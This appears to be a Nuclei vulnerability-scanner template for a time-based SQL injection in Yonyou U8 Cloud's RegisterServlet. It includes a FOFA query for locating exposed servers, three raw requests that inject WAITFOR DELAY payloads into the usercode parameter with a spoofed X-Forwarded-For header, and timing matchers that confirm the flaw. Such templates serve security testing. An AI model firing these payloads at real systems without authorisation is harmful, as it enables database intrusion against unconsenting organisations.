id: yonyou-u8c-login2-registerservlet-sqli

info:
  name: 用友-U8C-nc.bs.sm.login2.RegisterServlet-sql注入
  author: Abbbbb
  severity: high
  metadata:
    fofa-query: app="用友-U8-Cloud" || body="/api/uclient/public/"

http:
  - raw:
      - |
        GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27+WAITFOR+DELAY+%270:0:2%27--+dftS HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/json
        X-Forwarded-For: 127.0.0.1
        Accept-Encoding: gzip
        Connection: close
      - |
        GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27+WAITFOR+DELAY+%270:0:4%27--+dftS HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/json
        X-Forwarded-For: 127.0.0.1
        Accept-Encoding: gzip
        Connection: close
      - |
        GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27+WAITFOR+DELAY+%270:0:6%27--+dftS HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/json
        X-Forwarded-For: 127.0.0.1
        Accept-Encoding: gzip
        Connection: close
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>2 && duration_1<4"
          - "duration_2>4 && duration_2<6"
          - "duration_3>6 && duration_3<9"
